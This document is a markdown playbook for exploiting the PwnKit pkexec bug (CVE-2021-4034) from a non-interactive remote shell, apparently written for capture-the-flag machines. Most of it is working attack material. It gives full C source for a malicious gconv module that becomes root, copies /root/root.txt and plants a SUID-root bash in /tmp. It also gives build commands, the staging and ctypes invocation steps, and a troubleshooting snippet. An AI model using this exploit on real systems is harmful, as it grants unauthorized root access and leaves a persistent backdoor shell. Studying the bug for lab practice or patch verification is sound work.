# PwnKit (CVE-2021-4034) — no-`system()` gconv_init template

## When this applies

- Linux target with pkexec ≤ `0.105-26ubuntu1.1` / equivalent unpatched.
- You have RCE (web shell, SSRF, blind command injection) — anywhere with no real TTY.
- Goal: gain root via pkexec gconv_init injection without `system()`/`execve()` (which silently drops privs in non-TTY contexts).

## Description

When pkexec is unpatched, the standard public POCs load a malicious gconv module and call `setuid(0); setgid(0); system(<cmd>)` from inside `gconv_init`. **From a non-interactive RCE channel** (web shell, SSRF, blind command injection — anywhere with no real TTY), the `system()` payload silently fails: `gconv_init` runs as root, but the dash spawned by `system()` re-checks AT_SECURE-related state and drops privs back to the calling user. Net effect: the .so loaded, your `setuid(0)` succeeded, but `cp /root/root.txt /tmp/r.txt` returns `Permission denied` because tar/cp ran as the unprivileged caller.

**Fix**: do everything inline in `gconv_init` with raw libc syscalls — no `system()`, no `execve()`. Read the flag, drop a SUID-root shell for persistence:

## Steps

```c
// pwnkit.c — build with: gcc -shared -fPIC -o pwnkit.so pwnkit.c
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
__attribute__((constructor)) void ctor(void) {}
void gconv(void) {}
void gconv_init(void *step) {
    setuid(0); setgid(0);

    // Read the flag and write a copy you can read back via your RCE channel
    int rfd = open("/root/root.txt", O_RDONLY);
    int wfd = open("/tmp/r.txt", O_WRONLY|O_CREAT|O_TRUNC, 0644);
    char buf[1024]; int n;
    while ((n = read(rfd, buf, sizeof(buf))) > 0) write(wfd, buf, n);
    close(rfd); close(wfd); chmod("/tmp/r.txt", 0666);

    // Drop a SUID-root bash for re-entry
    int sfd = open("/bin/bash", O_RDONLY);
    int dfd = open("/tmp/rootbash", O_WRONLY|O_CREAT|O_TRUNC, 04755);
    while ((n = read(sfd, buf, sizeof(buf))) > 0) write(dfd, buf, n);
    close(sfd); close(dfd);
    chown("/tmp/rootbash", 0, 0);
    chmod("/tmp/rootbash", 04755);
    exit(0);
}
```

When the target has no compiler, cross-compile from your attacker host:

```bash
docker run --rm -v $PWD:/work -w /work --platform linux/amd64 gcc:10 \
  sh -c 'gcc -shared -fPIC -o pwnkit.so pwnkit.c -w'
```

Stage on target + invoke pkexec with NULL argv (ctypes is needed because Python's `os.execve` doesn't accept NULL argv):

```bash
mkdir pk && cd pk
echo '<base64-of-pwnkit.so>' | base64 -d > pwnkit.so && chmod 755 pwnkit.so
echo 'module UTF-8// PWNKIT// pwnkit 1' > gconv-modules
mkdir -p 'GCONV_PATH=.'
cp /usr/bin/true 'GCONV_PATH=./pwnkit.so:.'
python3 -c "
import ctypes
libc = ctypes.CDLL('libc.so.6')
env = (ctypes.c_char_p * 6)(
    b'pwnkit.so:.', b'PATH=GCONV_PATH=.', b'CHARSET=PWNKIT',
    b'SHELL=/lol/x', b'GIO_USE_VFS=', None)
libc.execve(b'/usr/bin/pkexec', (ctypes.c_char_p * 1)(None), env)"
# Then: cat /tmp/r.txt   /tmp/rootbash -p   ← root
```

## Diagnostic when the .so seems to "not run"

Add a constructor or early `open()` in `gconv_init` that writes a marker file with `getuid()`/`geteuid()`, e.g.:

```c
int f = open("/tmp/PWNKIT_GCONV.txt", O_WRONLY|O_CREAT|O_TRUNC, 0666);
char b[64]; int n = snprintf(b, 64, "ruid=%d euid=%d\n", getuid(), geteuid());
write(f, b, n); close(f);
```

If `/tmp/PWNKIT_GCONV.txt` is owned by `root:<your_group>`, the .so DID load in pkexec's pre-drop SUID context — your `setuid(0)` succeeded — and the bug is purely in the `system()`-spawned shell dropping privs. Switch to inline syscalls.

## Quick vulnerability sanity check on target

- `dpkg -l | grep policykit-1` → vulnerable if version < `0.105-26ubuntu1.2` (Ubuntu 20.04), `< 0.105-25ubuntu1.0+esm1` (Ubuntu 18.04), or upstream `< 0.120-3` (Debian 11).
- `pkexec --version` reports `0.105` for both vulnerable AND patched builds — version string alone is NOT a reliable indicator. Trust the dpkg version.

## Verifying success

- `/tmp/rootbash -p` returns root shell.
- `cat /tmp/r.txt` reveals `/root/root.txt` contents.

## Common pitfalls

- Calling `system()` or `execve()` from `gconv_init` drops privs in non-TTY context — use raw libc syscalls.
- `pkexec --version` is not a reliable patch indicator; always check `dpkg -l | grep policykit-1`.

## Tools

- gcc (cross-compile via docker if unavailable)
- ctypes (Python NULL argv invocation)
- base64
